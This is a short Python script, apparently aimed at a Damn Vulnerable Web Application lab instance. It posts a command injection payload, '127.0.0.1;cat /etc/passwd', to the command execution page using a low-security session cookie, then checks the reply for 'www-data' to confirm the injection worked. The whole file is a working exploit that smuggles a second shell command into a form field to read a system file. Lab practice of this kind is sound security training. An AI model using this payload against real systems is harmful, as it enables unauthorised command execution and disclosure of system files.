import requests

header = {"Cookie": "PHPSESSID=dbdi5ld1f3c46i219r9tloig96; security=low"}

url = "http://10.10.253.76/vulnerabilities/exec/"

data = {"ip":"127.0.0.1;cat /etc/passwd","Submit":"Submit"}

result = requests.post(url=url, data=data, headers=header)

if "www-data" in str(result.content):
    print("Command injection is successful!")
